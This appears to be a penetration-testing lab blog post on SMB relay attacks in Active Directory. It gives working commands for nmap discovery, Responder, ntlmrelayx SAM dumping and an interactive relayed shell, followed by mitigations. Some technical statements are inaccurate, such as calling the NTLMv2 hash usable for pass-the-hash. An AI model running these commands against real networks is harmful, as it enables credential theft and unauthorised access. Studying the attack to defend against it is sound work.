---
title: "SMB Relay Attack "
layout: post
category: Active-Directory
tags: [SMB]
excerpt: " "
---

# SMB Relay Overview 

A SMB relay attack is where an attacker captures a users NTLM hash and relays its to another machine on the network. Masquerading as the user and authenticating against SMB to gain shell or file access

## **How does an SMB Relay Attack Happen?**  
The SMB Relay attack abuses the NTLM challenge-response protocol. Commonly, all SMB  sessions used the NTML protocol for encryption and authentication purposes (i.e. NTLM  over SMB) . However, most sysadmins switched to KILE over SMB after research proved that the first version of NTLM is susceptible to Man-in-the-Middle attacks, the SMB Relay attack counting among them.  
Now, in normal client-server communication, there are a series of requests followed by  responses. **The idea behind an SMB Relay attack is to position yourself between the client and the server in order to capture the data packets transmitted between the two entities.**  


## **Requirements**  
-  SMB signing must be disabled on the target  
-  Relayed user credentials must be admin on machine



#  SMB Relay Attack 
-  **Discovering Hosts with SMB Signing Disabled**

```bash
sudo nmap -p445,139 --script=smb2-security-mode.nse -T4 192.168.1.0/24
```

![Desktop View](/assets/img/AD_Lab/1 (67).png){: }


**add ip of disable smb to target.txt

-  **Configuring Responder**
Because we have to relay the hash instead of just capturing it responder needs to have both the SMB server turned off and HTTP turned off. Edit the responder config file in **/etc/responder/Responder.conf** and turn off SMB and HTTP and then start responder 

![Desktop View](/assets/img/AD_Lab/1 (68).png){: }

**Run responder** 

```bash 
sudo responder -I eth0 -rdw -v
```

Responder should now look like this:

![Desktop View](/assets/img/AD_Lab/1 (69).png){: }

-  **Setup the relay script**

```bash
sudo ntlmrelayx.py -tf target.txt -smb2support
```

![Desktop View](/assets/img/AD_Lab/1 (70).png){: }

-  **Capturing the hash, relaying it and dumping the local SAM file**

Request a share that does not exist using an admin account. Notice how the script checks if Remote Registry is enabled and if not, enables it, dumps the SAM and then re-disables it.

![Desktop View](/assets/img/AD_Lab/1 (65).png){: }

- now we get SAM hash , we can crack them or pass this hash to gain a shell

![Desktop View](/assets/img/AD_Lab/1 (71).png){: }

**We can then takes these hashes and crack them or we can even attempt a pass-the-hash attack and attempt to gain a shell with the NTLMv2 hash on a different machine on the network.**


### Get Interactive Shell

```bash
sudo ntlmrelayx.py -tf target.txt -smb2support -i
```

![Desktop View](/assets/img/AD_Lab/1 (72).png){: }

- run nc for localhost and  port

```bash
nc 127.0.0.1 11001

-> help
```

![Desktop View](/assets/img/AD_Lab/1 (73).png){: }


# SMB Relay Attack Mitigation
-  Enable SMB Signing on all devices. This can be done via Group Policy
-  Disable NTLM authentication on the network. Use Kerberos instead.
-  Limit Domain Admins to specific task

# Conclusion
SMB relay attacks don’t have the same potency as ransomware such as Ryuk or RobbinHood, but they can provide the necessary ‘backdoor’ to those two and others. As always, play it safe, keep your apps and software up-to-date, and employ great cybersecurity.


# reference
- https://cqureacademy.com/blog/penetration-testing/smb-relay-attack
- https://heimdalsecurity.com/blog/what-is-an-smb-relay-attack/
